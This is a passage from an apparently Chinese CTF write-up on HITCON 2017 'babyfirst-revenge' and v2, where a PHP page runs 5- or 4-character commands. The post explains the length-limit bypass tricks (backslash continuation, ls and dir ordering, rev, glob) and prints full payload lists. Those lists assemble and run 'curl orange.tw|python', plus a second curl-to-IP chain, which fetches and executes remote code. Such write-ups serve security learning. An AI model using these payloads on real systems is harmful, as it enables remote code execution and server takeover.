function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>看代码是需要5个字符去绕过然后执行命令，关于linux命令限制突破，在P神的<a href="https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html" target="_blank" rel="noopener">《小密圈里的那些奇技淫巧》</a>早就有提到过，通过拆分来getshell<br>知识点：</p><ol><li>网络上下载文件的命令：curl、GET、wget</li><li><strong>linux可以利用<code>\</code>换行续写</strong></li><li>linux<code>&gt;</code>重定向,<code>&gt;</code>覆盖原有内容<code>&gt;&gt;</code>追加内容</li><li><strong>文件中的命令错误不影响之后命令的执行</strong></li><li>还有就是<code>ls</code>的<strong>排序问题</strong>，默认的排序方式显示符号再是数字，最后按字母顺序【注意，字母是<code>aAbB</code>这种顺序，即字母序】，而<code>ls -t</code>又超出长度限制，这就导致不得不考虑排序问题<br><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200313000138.png" alt></li></ol><p>这样的话题目思路就很清晰了，通过拆分通过拆分payload写入文件来执行远程VPS上的文件</p><p>目前拆分思路：</p><ol><li>先将<code>ls -t</code>写进一个文件，再按照时间顺序来写入payload，最后分别执行两个文件【官方payload】如下：</li></ol><pre class=" language-python"><code class="language-python">payload <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token comment" spellcheck="true"># generate `ls -t>g` file</span>    <span class="token string">'>ls\\'</span><span class="token punctuation">,</span>     <span class="token string">'ls>_'</span><span class="token punctuation">,</span>     <span class="token string">'>\ \\'</span><span class="token punctuation">,</span>     <span class="token string">'>-t\\'</span><span class="token punctuation">,</span>     <span class="token string">'>\>g'</span><span class="token punctuation">,</span>     <span class="token string">'ls>>_'</span><span class="token punctuation">,</span>     <span class="token comment" spellcheck="true"># generate `curl orange.tw|python`</span>    <span class="token string">'>on'</span><span class="token punctuation">,</span>     <span class="token string">'>th\\'</span><span class="token punctuation">,</span>     <span class="token string">'>py\\'</span><span class="token punctuation">,</span>     <span class="token string">'>\|\\'</span><span class="token punctuation">,</span>     <span class="token string">'>tw\\'</span><span class="token punctuation">,</span>    <span class="token string">'>e.\\'</span><span class="token punctuation">,</span>     <span class="token string">'>ng\\'</span><span class="token punctuation">,</span>     <span class="token string">'>ra\\'</span><span class="token punctuation">,</span>     <span class="token string">'>o\\'</span><span class="token punctuation">,</span>     <span class="token string">'>\ \\'</span><span class="token punctuation">,</span>     <span class="token string">'>rl\\'</span><span class="token punctuation">,</span>     <span class="token string">'>cu\\'</span><span class="token punctuation">,</span>     <span class="token comment" spellcheck="true"># exec</span>    <span class="token string">'sh _'</span><span class="token punctuation">,</span>     <span class="token string">'sh g'</span><span class="token punctuation">,</span> <span class="token punctuation">]</span></code></pre><ol start="2"><li><p>直接按照顺序写，当遇到后面的优先级比前面的大的时候可以先将前面的命令写入文件，再利用<code>rm</code>命令删除，最后的时候再利用<code>&gt;&gt;</code>来追加【其实第一种也要用到这个思路】<br>【例子如下，取自<a href="https://findneo.github.io/171110Bypass4CLimit/" target="_blank" rel="noopener">payload</a>】</p><pre class=" language-python"><code class="language-python">build <span class="token operator">=</span> <span class="token punctuation">[</span>'<span class="token operator">></span>cur\'<span class="token punctuation">,</span>      '<span class="token operator">></span>l \'<span class="token punctuation">,</span>      <span class="token string">'ls>A'</span><span class="token punctuation">,</span>      <span class="token string">'rm c*'</span><span class="token punctuation">,</span>      <span class="token string">'rm l*'</span><span class="token punctuation">,</span>      '<span class="token operator">></span><span class="token number">105</span>\'<span class="token punctuation">,</span>      '<span class="token operator">></span><span class="token number">304</span>\'<span class="token punctuation">,</span>      '<span class="token operator">></span><span class="token number">301</span>\'<span class="token punctuation">,</span>      '<span class="token operator">></span><span class="token number">9</span><span class="token operator">></span>\'<span class="token punctuation">,</span>      <span class="token string">'ls>>A'</span><span class="token punctuation">,</span>      <span class="token string">'sh A'</span><span class="token punctuation">,</span>      <span class="token string">'php A'</span>      <span class="token punctuation">]</span></code></pre><p>V1到这就没什么好说的了，再看V2：<br>代码：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string">'/www/sandbox/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">"orange"</span> <span class="token punctuation">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span> @<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     @<span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'reset'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     @<span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">'/bin/rm -rf '</span> <span class="token punctuation">.</span> <span class="token variable">$sandbox</span><span class="token punctuation">)</span> <span class="token punctuation">}</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span></code></pre></li></ol><pre><code>限制到了4个字符，首先，禁用了`&gt;&gt;`追加，在就是导致我们没法利用`rm`,即第二种拆分思路已经失效，只能采取第一种，而这就又有一个问题，那就是`ls -t`的拆分，无论怎么拆都满足不了字母序的条件。下面就是这道题目的知识点了：1. dir命令：dir等于ls -C -b;也就是说，默认情况下，文件列在列中，垂直排序，特殊字符由反斜杠转义序列表示。和ls基本一样，但是好出就是dir是d开头字典序在前。2. rev命令：将文件中的每行内容以字符为单位反序输出，即第一个字符最后输出，最后一个字符最先输出，依次类推。3. 还有就是`*`，这就是最有趣的地方了，`*`再linux中代表任意个数的通配符，但是如果单单只输入一个`*`的时候就类似于`$(dir *)`    ![](https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200313013049.png)综上的话，思路就有了：思路就是V1思路的第一思路，重点在于如何写入`ls -t&gt;f`，有了上面的知识点，我们可以构造`dir f&gt; t- sl`【d的字母序必须再最前】,然后通过`*&gt;v`执行并重定向给`v`，在创建一个`rev`文件，然后通过 `*v&gt;g`执行`rev v`来将`ls -t&gt;f`写入g中再操作期间发现t的字母序要再s的后面，这就导致不能达成上面的条件![](https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200313015518.png)解决方法是加多一个参数，例如h，ls只带参数h的不带参数l话那这个参数是毫无意义的，把t-换成ht-后成功满足![](https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200313020234.png)在之后就是V1的思路了【官方payload】```pythonpayload = [    # generate &quot;g&gt; ht- sl&quot; to file &quot;v&quot;    &#39;&gt;dir&#39;,     &#39;&gt;sl&#39;,     &#39;&gt;g\&gt;&#39;,    &#39;&gt;ht-&#39;,    &#39;*&gt;v&#39;,    # reverse file &quot;v&quot; to file &quot;x&quot;, content &quot;ls -th &gt;g&quot;    &#39;&gt;rev&#39;,    &#39;*v&gt;x&#39;,    # generate &quot;curl orange.tw|python;&quot;    &#39;&gt;\;\\&#39;,     &#39;&gt;on\\&#39;,     &#39;&gt;th\\&#39;,     &#39;&gt;py\\&#39;,     &#39;&gt;\|\\&#39;,     &#39;&gt;tw\\&#39;,    &#39;&gt;e.\\&#39;,     &#39;&gt;ng\\&#39;,     &#39;&gt;ra\\&#39;,     &#39;&gt;o\\&#39;,     &#39;&gt;\ \\&#39;,     &#39;&gt;rl\\&#39;,     &#39;&gt;cu\\&#39;,     # got shell    &#39;sh x&#39;,     &#39;sh g&#39;, ]</code></pre><p>参考文章：</p><ul><li><a href="https://findneo.github.io/171110Bypass4CLimit/" target="_blank" rel="noopener">如何绕过四个字符限制getshell</a></li><li><a href="https://xz.aliyun.com/t/1579" target="_blank" rel="noopener">HITCON 2017 babyfirst-revenge(-v2)浅析</a></li></ul><hr><p>版权声明：</p><p>除非注明，本博文章均为原创，转载请以链接形式标明本文地址。</p><hr>]]></content>
      
      
      
        <tags>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
